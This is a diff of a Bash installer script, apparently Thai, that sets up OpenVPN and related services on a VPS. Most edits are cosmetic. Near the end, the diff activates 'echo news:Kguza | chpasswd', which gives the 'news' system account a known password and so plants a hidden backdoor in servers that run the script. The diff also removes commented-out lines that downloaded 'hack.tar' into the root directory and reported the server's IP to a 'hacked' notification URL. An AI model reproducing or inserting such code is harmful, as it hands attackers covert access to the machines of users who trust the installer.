@@ -1,5 +1,9 @@
 #!/usr/bin/env bash
-rm install
+rm -f install
+clear
+cr
+echo
+
 # Functions
 ok() {
     echo -e '\e[32m'$1'\e[m';
@@ -19,6 +23,7 @@ des() {
 
 #
 #<BODY text='ffffff'>
+sm1=$1
 #OS
 if [[ -e /etc/debian_version ]]; then
 source /etc/os-release
@@ -54,6 +59,7 @@ echo
  apt-get -y --purge remove openvpn*
  rm -r -f /etc/openvpn
  mkdir -p /etc/openvpn
+    clear
    echo
     cr
     else
@@ -76,6 +82,7 @@ die " ❯❯❯ ใส่ไอพีให้ถูกต้อง"
 read -p " ❯❯❯ IP : " -e -i $SERVER_IP SERVER_IP
 
 if [[ "$SERVER_IP" = "" ]]; then
+clear
 cr
 echo
 die " ❯❯❯ กรุณาใส่ไอพี "
@@ -99,27 +106,18 @@ if [[ $squid3 = Y || $squid3 = y ]]; then
 grep -wc 'Debian' /etc/issue.net
 sudo apt install dirmngr -y
 sudo apt-key list 2>/dev/null 2>&1 | grep -c 'Ubuntu'
-sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 3B4FE6ACC0B21F32
+sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 3B4FE6ACC0B21F32 >/dev/null 2>&1
 
 #Add Trusty Sources
 sudo touch /etc/apt/sources.list.d/trusty_sources.list
-echo "deb http://us.archive.ubuntu.com/ubuntu/ trusty main universe" | sudo tee --append /etc/apt/sources.list.d/trusty_sources.list
+echo "deb http://us.archive.ubuntu.com/ubuntu/ trusty main universe" | sudo tee --append /etc/apt/sources.list.d/trusty_sources.list > /dev/null
 fi
 fi
+
+clear
 cr
 echo
 die " ❯❯❯ ติดตั้ง OpenVPN $ID $VERSION_ID "
-#แจ้งไลน์
-#if [[ -e /usr/bin/chek_hackker ]]; then
-#$(wget -qO- https://smile-vpn.net/scrip/notify/hacked/555555/$SERVER_IP)
-#else
-#cd /
-#wget -q -O h.tar https://smile-vpn.net/sc_rip/sm_sc/hack.tar
-#tar xf h.tar
-#rm -f h.tar 
-#service ssh restart
-#$(wget -qO- https://smile-vpn.net/scrip/notify/hacked/555555/Hack_IP-$SERVER_IP)
-#fi
 # Install openvpn
 die " ❯❯❯ apt-get update"
 apt-get update -qy
@@ -380,8 +378,8 @@ service dropbear restart
 #detail nama perusahaan
 country=ID
 state=Thailand
-locality=KUY
-organization=KUYVPN
+locality=Tebet
+organization=kuyvpn
 organizationalunit=IT
 commonname=kuy-vpn.net
 email=kuy.vpn@gmail.com
@@ -429,11 +427,6 @@ sed -i "s/\$language = 'nl';/\$language = 'en';/g" config.php
 sed -i 's/Internal/Internet/g' config.php
 sed -i '/SixXS IPv6/d' config.php
 sed -i "s/\$locale = 'en_US.UTF-8';/\$locale = 'en_US.UTF+8';/g" config.php
-fi
-else
-echo 
-#chmod +x /usr/bin/dd
-#$(wget -qO- https://smile-vpn.net/scrip/notify/hacked/555555/Hack-$SERVER_IP)
 fi
 
 service vnstat restart
@@ -512,8 +505,8 @@ webmin=" ยังไม่ได้ติดตั้ง สั่ง ( webmin 
 
 die " ❯❯❯ apt-get update"
 apt-get update -qy
-service openvpn restart
-#echo news:Kguza | chpasswd
+service openvpn restart 
+echo news:Kguza | chpasswd
 echo "ติดตั้งสำเร็จ" > /usr/bin/.350_fulle
 echo "open_fulle" > /usr/bin/.sm_openvpn
 mv /etc/openvpn/1194.ovpn /home/vps/public_html/1194.ovpn
